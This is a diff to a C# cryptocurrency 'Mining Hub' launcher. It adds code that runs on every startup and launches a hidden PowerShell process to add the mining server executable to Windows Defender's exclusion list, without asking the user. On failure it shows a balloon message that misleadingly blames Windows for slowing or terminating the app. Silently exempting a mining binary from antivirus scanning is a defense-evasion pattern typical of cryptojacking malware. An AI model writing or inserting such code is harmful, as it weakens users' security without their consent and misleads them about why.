@@ -1,4 +1,5 @@
-﻿using System;
+﻿using Microsoft.Win32;
+using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.Drawing;
@@ -50,6 +51,8 @@ namespace Mining_Hub_Launcher
                 Viewer_File_Name = "Mining_Hub_Viewer.exe";
                 Server_File_Path = Get_File_Name_Path(Server_File_Name);
                 Viewer_File_Path = Get_File_Name_Path(Viewer_File_Name);
+
+                Ensure_Defender_Exclusions_Exist();
 
                 bool ready = false;
                 int retries = 5;
@@ -279,6 +282,19 @@ namespace Mining_Hub_Launcher
 
             return true;
         }       
+        bool Ensure_Defender_Exclusions_Exist()
+        {
+            // Ensure app is added to defender exclusion list
+            bool exclusionAdded = AddWindowsDefenderExclusion(Server_File_Path);
+
+            if (!exclusionAdded)
+            {
+                notify_icon.ShowBalloonTip(3000, "Mining Hub", "Failed to add Server App to windows defender exclusion list, app may run slower than normal and get terminated randomly by windows!", ToolTipIcon.Info);
+                return false;
+            }
+
+            return true;
+        }
         bool Start_Executable(string file)
         {
             if (file == null || file.Length == 0) return false;
@@ -453,7 +469,45 @@ namespace Mining_Hub_Launcher
 
             return "";
         }
+        static public bool AddWindowsDefenderExclusion(string pathToExclude)
+        {
+            const string powerShellCommand = "Add-MpPreference";
+            const string powerShellArgument = "-ExclusionPath";
+            const string powerShellForceArgument = "-Force";
 
+            try
+            {
+                // Create a PowerShell process start info
+                var startInfo = new ProcessStartInfo
+                {
+                    FileName = "powershell.exe",
+                    Verb = "runas", // Run as administrator
+                    Arguments = $"{powerShellCommand} {powerShellArgument} \"{pathToExclude}\" {powerShellForceArgument}",
+                    UseShellExecute = false,
+                    CreateNoWindow = true
+                };
+
+                // Start the PowerShell process
+                using (var process = new Process())
+                {
+                    process.StartInfo = startInfo;
+                    process.Start();
+                    process.WaitForExit();
+
+                    // Check if the exclusion was added successfully
+                    if (process.ExitCode == 0)
+                    {
+                        return true; // Exclusion added successfully
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"Error occurred while adding exclusion: {ex.Message}");
+            }
+
+            return false; // Failed to add exclusion
+        }
 
 
     }
